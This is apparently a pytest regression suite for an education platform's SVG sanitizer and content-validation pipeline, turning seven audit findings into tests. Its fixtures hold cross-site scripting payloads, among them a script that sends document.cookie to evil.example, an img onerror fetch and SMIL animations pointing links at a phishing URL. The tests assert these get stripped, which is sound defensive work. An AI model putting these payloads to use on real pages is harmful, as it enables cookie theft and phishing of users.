"""Wave-30 adversarial review: the seven defects the audit measured in the wave-30 fixes.

Each test below is the adversary's own reproduction, turned into a gate. In order:

1. **[leak] `attributeName` is read case-sensitively.** `sanitize._animates_a_url` called
   `el.get("attributeName")` — exact camelCase, because ElementTree is XML. Spell it
   `attributename` and the animation is neither removed nor stripped, yet the HTML Standard's
   *adjust SVG attributes* table (§13.2.6.5) folds it back to `attributeName` inside the render
   worker's `dangerouslySetInnerHTML`, where the SMIL animation is live.
2. **[leak] `svg_violations` only inspects the `<svg>…</svg>` slice.** Anything before or after
   it is invisible to the serve-path detector and served verbatim.
3. **[wrong] the sanitizer never emptied the corpus.** The "615 animations / every film blank"
   causation written into shipped source is not what the corpus shows.
4. **[wrong] the lint-failure rebuild still carried an empty payload.**
5. **[wrong] a seed written by `validate.py` is still `verified: true`, and one is `canonical`.**
6. **[sloppy] `_check_working` never compares one line with the next.**
7. **[sloppy] `_grade_key` merges classes that are not the same class.**
"""

from __future__ import annotations

import json
import re
from datetime import UTC, datetime
from pathlib import Path

import pytest
from wobo_gateway.plexus import engines, store, validate
from wobo_gateway.plexus.maths import check_compose
from wobo_gateway.plexus.sanitize import sanitize_svg, svg_violations


@pytest.fixture(autouse=True)
def cache_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("PLEXUS_CACHE_DIR", str(tmp_path))
    monkeypatch.delenv("GEMINI_API_KEY", raising=False)
    monkeypatch.delenv("GOOGLE_AI_API_KEY", raising=False)
    return tmp_path


# --- 1. the attribute NAME is case-folded by the HTML parser, so fold it here ---------------

CASE_SMUGGLED = [
    pytest.param(
        '<svg viewBox="0 0 10 10"><a href="#x">'
        '<animate attributename="href" to="https://evil.example/phish" dur="1s" fill="freeze"/>'
        '<rect width="10" height="10"/></a></svg>',
        id="lowercase attributename -> href",
    ),
    pytest.param(
        '<svg viewBox="0 0 10 10"><image href="#i">'
        '<animate ATTRIBUTENAME="xlink:href" to="https://evil.example/track.png" dur="1s"'
        ' fill="freeze"/></image></svg>',
        id="uppercase ATTRIBUTENAME -> xlink:href",
    ),
    pytest.param(
        '<svg viewBox="0 0 10 10"><rect width="10" height="10">'
        '<animate attributename="style" to="fill:url(https://evil.example/a)" dur="1s"'
        ' fill="freeze"/></rect></svg>',
        id="lowercase attributename -> style, url()",
    ),
]


@pytest.mark.parametrize("dirty", CASE_SMUGGLED)
def test_an_animation_target_is_matched_whatever_its_case(dirty: str) -> None:
    """`attributename` is `attributeName` to an HTML parser. It must be to the sanitizer too."""
    clean = sanitize_svg(dirty)
    assert clean is not None
    assert "evil.example" not in clean
    assert "url(" not in clean.lower()


@pytest.mark.parametrize("dirty", CASE_SMUGGLED)
def test_the_serve_path_detector_sees_the_case_smuggled_animation_too(dirty: str) -> None:
    assert svg_violations(dirty) != []


def test_an_ordinary_animation_still_keeps_its_function_whatever_its_case() -> None:
    """The case-folding widens what is *matched*, never what is *removed*: an animation that
    does not target a URL or `style` keeps its animation function in either spelling."""
    svg = (
        '<svg viewBox="0 0 10 10">'
        '<text opacity="0"><animate attributename="opacity" values="0;1" dur="1s"/></text>'
        '<circle r="2"><animate attributeName="r" from="1" to="2" dur="1s"/></circle>'
        "</svg>"
    )
    clean = sanitize_svg(svg)
    assert clean is not None
    assert 'values="0;1"' in clean
    assert 'from="1"' in clean and 'to="2"' in clean
    assert svg_violations(svg) == []


# --- 2. the detector must judge the WHOLE string it will hand to an HTML parser -------------

CLEAN_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect id="x"/></svg>'


@pytest.mark.parametrize(
    "poisoned",
    [
        pytest.param(
            '<script>fetch("https://evil.example/?c="+document.cookie)</script>' + CLEAN_SVG,
            id="script prefixed before the svg",
        ),
        pytest.param(
            CLEAN_SVG + "<img src=x onerror=\"fetch('https://evil.example/steal')\">",
            id="img onerror suffixed after the svg",
        ),
    ],
)
def test_markup_outside_the_svg_element_is_a_violation(poisoned: str) -> None:
    """`Explainer.tsx` passes the WHOLE string to `dangerouslySetInnerHTML`, so the question the
    serve path must ask is "is this string, entire, safe" — not "is the `<svg>` inside it safe"."""
    assert svg_violations(poisoned) != []
    assert engines._cache_read_refusals("diagram", poisoned) != []


def test_ordinary_whitespace_around_the_svg_is_not_a_violation() -> None:
    assert svg_violations("\n  " + CLEAN_SVG + "  \n") == []


@pytest.mark.parametrize(
    "poisoned",
    [
        '<script>fetch("https://evil.example/?c="+document.cookie)</script>' + CLEAN_SVG,
        CLEAN_SVG + "<img src=x onerror=\"fetch('https://evil.example/steal')\">",
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><a href="#x">'
        '<animate attributename="href" to="https://evil.example/phish" dur="1s"/>'
        "</a></svg>",
    ],
)
def test_a_poisoned_cache_record_never_reaches_the_learner(poisoned: str) -> None:
    """End to end, the way the adversary ran it: poison the record on disk, then serve it."""
    concept = "poisoned diagram " + str(abs(hash(poisoned)) % 10_000)
    store.save(
        concept,
        "diagram",
        "core",
        {
            "concept": concept,
            "modality": "diagram",
            "difficulty": "core",
            "verified": True,
            "seeded": False,
            "status": store.CANONICAL,
            "provenance": {
                "engine": "engine.diagram",
                "model": "anthropic/claude-opus-4.6",
                "prompt_version": store.PROMPT_VERSION,
            },
            "artifact": poisoned,
            "createdAt": datetime.now(UTC).isoformat(timespec="seconds"),
        },
        None,
    )
    served = engines.run_engine(
        capability="engine.diagram",
        payload={"concept": concept, "difficulty": "core"},
        provider_model="mock",
        live=True,
    )
    assert "evil.example" not in json.dumps(served.output)


# --- 3. the corpus was never emptied by the sanitizer --------------------------------------


def test_the_source_does_not_blame_the_sanitizer_for_the_blank_films() -> None:
    """The measured truth: the models emit `<animate>` with `keyTimes`/`dur` and no animation
    function at all, in the RAW responses that never passed through sanitize. The over-broad
    rule was real and worth removing, but it is not why the films are blank, and a shipped
    comment that says otherwise will be believed by the next reader."""
    source = Path(engines.__file__).with_name("sanitize.py").read_text(encoding="utf-8")
    assert "615" not in source
    assert "every film in the product blank" not in source


_ANIMATE_EL = re.compile(r"<(?:ns\d+:)?animate\b[^>]*/?>", re.I)
_VALUE_ATTR = re.compile(r"\b(?:values|from|to|by)=")


def _corpus_root() -> Path | None:
    for parent in Path(__file__).resolve().parents:
        candidate = parent / ".lab" / "artifacts"
        if candidate.is_dir():
            return candidate
    return None


def test_the_raw_model_responses_carry_no_animation_function_either() -> None:
    """The decisive measurement. These files never went through `sanitize_svg`, so whatever is
    missing from them was never taken by it."""
    root = _corpus_root()
    if root is None:
        pytest.skip("judged artifact corpus (.lab/artifacts) not present in this checkout")
    raw = sorted(root.rglob("*.response.json"))
    if not raw:
        pytest.skip("no raw model responses in the corpus")

    strings: list[str] = []

    def walk(obj: object) -> None:
        if isinstance(obj, str):
            if "<svg" in obj and "</svg>" in obj:
                strings.append(obj)
        elif isinstance(obj, dict):
            for value in obj.values():
                walk(value)
        elif isinstance(obj, list):
            for value in obj:
                walk(value)

    for path in raw:
        try:
            walk(json.loads(path.read_text(encoding="utf-8")))
        except (OSError, ValueError):
            continue

    elements = [el for text in strings for el in _ANIMATE_EL.findall(text)]
    if not elements:
        pytest.skip("no <animate> elements in the raw responses")
    assert sum(1 for el in elements if _VALUE_ATTR.search(el)) == 0, (
        "the raw responses DO carry animation functions, so the sanitizer really was the "
        "thing removing them — rewrite this test and the source comment it guards"
    )


# --- 4 & 5. the lint-failure rebuild's payload, and what a seed is allowed to claim ---------

BAD_COMPOSE = {
    "outline": ["Solving linear equations"],
    "workbook": [{"id": "i1", "type": "short", "prompt": "Solve 2x + 4 = 16.", "answer": "x = 8"}],
    "boss": [],
}
SCOPE = {
    "board": "CBSE",
    "grade": "8",
    "subject": "Maths",
    "chapter": "Linear equations",
    "contentVersion": "2026-27",
    "variant": "",
}


def _provisional_record() -> dict[str, object]:
    return {
        "concept": "linear equations",
        "modality": "compose",
        "difficulty": "core",
        "verified": True,
        "seeded": False,
        "status": store.PROVISIONAL,
        "provenance": {
            "engine": "engine.compose",
            "model": "anthropic/claude-opus-4.6",
            "prompt_version": store.PROMPT_VERSION,
        },
        "artifact": BAD_COMPOSE,
        "createdAt": datetime.now(UTC).isoformat(timespec="seconds"),
    }


def _run_lint_failure(monkeypatch) -> tuple[dict[str, object], dict[str, object]]:
    """Drive the lint-failure route with a rebuild that falls to a seed, and report both the
    payload the rebuild was handed and the record the learner is served."""
    seen: dict[str, object] = {}

    def fake_generate_live(modality, concept, difficulty, model, fallbacks, payload, **_kw):
        seen["payload"] = payload
        return engines._seed(modality, concept, difficulty), model, 0, True

    monkeypatch.setattr(engines, "_generate_live", fake_generate_live)
    out = validate.validate_and_promote(
        concept="linear equations",
        modality="compose",
        difficulty="core",
        scope=SCOPE,
        record=_provisional_record(),
        judge_model="judge/x",
        escalation_model="openai/gpt-5.5",
    )
    return seen, out


def test_the_lint_failure_rebuild_is_written_for_the_same_child(monkeypatch) -> None:
    """`_promote_after_lint_failure` passed `{}`, which sends the rebuild back to the generic
    reader — and a lint-clean rebuild from here is promoted to canonical with no judge call at
    all, so generic-reader content lands unscored in a board+class-scoped slot."""
    seen, _ = _run_lint_failure(monkeypatch)
    payload = seen["payload"]
    assert isinstance(payload, dict)
    assert payload.get("board") == "CBSE"
    assert payload.get("grade") == "8"
    assert payload.get("contentVersion") == "2026-27"


def test_a_lint_refused_seed_is_never_canonical_and_never_verified(monkeypatch) -> None:
    """The most reachable seed path in the system — every artifact the answer-checker disproves
    routes through it — was the one still stamped `status: canonical, verified: true`."""
    _, out = _run_lint_failure(monkeypatch)
    assert out["seeded"] is True
    assert out["status"] == store.PROVISIONAL
    assert out["verified"] is False
    served = engines._public(out)
    assert served["status"] == store.PROVISIONAL
    assert served["verified"] is False
    assert served["provenance"]["placeholder"] is True


def test_a_quality_refused_seed_is_never_verified(monkeypatch) -> None:
    """The other seed `validate.py` writes: the judge scored it and refused it."""

    def fake_generate_live(modality, concept, difficulty, model, fallbacks, payload, **_kw):
        return engines._seed(modality, concept, difficulty), model, 0, True

    monkeypatch.setattr(engines, "_generate_live", fake_generate_live)
    monkeypatch.setattr(
        validate,
        "_judge",
        lambda *a, **k: {"score": 12.0, "critical": False, "weak": [], "notes": ""},
    )
    good = {
        "outline": ["Solving linear equations"],
        "workbook": [
            {"id": "i1", "type": "short", "prompt": "Solve 2x + 4 = 16.", "answer": "x = 6"}
        ],
        "boss": [],
    }
    out = validate.validate_and_promote(
        concept="linear equations",
        modality="compose",
        difficulty="core",
        scope=SCOPE,
        record={**_provisional_record(), "artifact": good},
        judge_model="judge/x",
        escalation_model="openai/gpt-5.5",
    )
    assert out["seeded"] is True
    assert out["status"] == store.PROVISIONAL
    assert out["verified"] is False
    assert engines._public(out)["verified"] is False


def test_the_gates_own_answer_reaches_the_client_beside_the_score() -> None:
    """`provenance.validation.passed` was written into the record and then dropped on the way
    out, so a judge-unreachable artifact left the brain `verified: true`, `source: generated`,
    `score: null` — indistinguishable from a passing lesson except by a null."""
    public = engines._public_provenance(
        {
            "engine": "engine.compose",
            "model": "anthropic/claude-opus-4.6",
            "validation": {
                "model": "judge/x",
                "validatedAt": "2026-09-05T00:00:00+00:00",
                "score": None,
                "passed": False,
            },
        }
    )
    assert public["validation"]["passed"] is False
    assert "model" not in public["validation"]  # the judge's identity is still ours


def test_a_judge_unreachable_artifact_says_it_did_not_pass(monkeypatch) -> None:
    monkeypatch.setattr(validate, "_judge", lambda *a, **k: None)
    good = {
        "outline": ["Solving linear equations"],
        "workbook": [
            {"id": "i1", "type": "short", "prompt": "Solve 2x + 4 = 16.", "answer": "x = 6"}
        ],
        "boss": [],
    }
    out = validate.validate_and_promote(
        concept="linear equations",
        modality="compose",
        difficulty="core",
        scope=SCOPE,
        record={**_provisional_record(), "artifact": good},
        judge_model="judge/x",
        escalation_model="",
    )
    assert engines._public(out)["provenance"]["validation"]["passed"] is False


# --- 6. one line of working must agree with the next ---------------------------------------


def _derivation(steps: list[str], **card: object) -> dict[str, object]:
    return {"cards": [{"id": "c1", "derivation": {"steps": [{"expr": s} for s in steps], **card}}]}


@pytest.mark.parametrize(
    "steps",
    [
        pytest.param(["2x + 4 = 16", "2x = 11"], id="line 2 contradicts line 1"),
        pytest.param(["3x = 12", "x = 7"], id="a wrong value for a solved unknown"),
    ],
)
def test_a_line_that_contradicts_the_line_before_it_is_refused(steps: list[str]) -> None:
    """The commonest way a worked example goes wrong is not a self-contradictory line — it is
    line 2 disagreeing with line 1, and nothing compared them. A derivation card with no
    `answer` was therefore unchecked end to end."""
    assert check_compose(_derivation(steps)) != []


@pytest.mark.parametrize(
    "steps",
    [
        pytest.param(["2x + 4 = 16", "2x = 12", "x = 6"], id="a correct chain"),
        pytest.param(["x**2 = 25", "x = 5"], id="narrowing to one root is not a contradiction"),
        pytest.param(["s = 2*a + b", "b = 3"], id="two unknowns, no claim about either"),
        pytest.param(["A = pi*r**2", "A = 3.14*r**2"], id="a symbolic restatement"),
    ],
)
def test_honest_working_is_not_refused(steps: list[str]) -> None:
    assert check_compose(_derivation(steps)) == []


def test_the_self_contradictory_line_is_still_caught() -> None:
    assert check_compose(_derivation(["D = 36 - 4*10 = 5"])) != []


# --- 7. two classes that are not the same class must not share one artifact -----------------


@pytest.mark.parametrize(
    ("left", "right"),
    [
        pytest.param("11", "11-12", id="a class and a class span"),
        pytest.param("10", "Class 10 (2019 scheme)", id="a class and a dated scheme"),
    ],
)
def test_two_different_classes_never_share_one_key(left: str, right: str) -> None:
    """`_grade_key` took the FIRST integer anywhere in the string. "11-12" is the ordinary way
    senior secondary is written in Indian syllabus documents, and it resolved to the class-11
    artifact — the same over-merge the scoped key exists to remove, one notch smaller."""
    base = {"board": "CBSE", "contentVersion": "2026-27", "variant": ""}
    assert store.scope_key({**base, "grade": left}) != store.scope_key({**base, "grade": right})


@pytest.mark.parametrize(
    ("left", "right"),
    [
        pytest.param("8", "Class 8", id="a bare class and a spelled class"),
        pytest.param("Class 8", "class-8", id="two spellings of one class"),
        pytest.param(" 8 ", "8", id="whitespace"),
    ],
)
def test_one_class_spelled_two_ways_is_still_one_key(left: str, right: str) -> None:
    base = {"board": "CBSE", "contentVersion": "2026-27", "variant": ""}
    assert store.scope_key({**base, "grade": left}) == store.scope_key({**base, "grade": right})
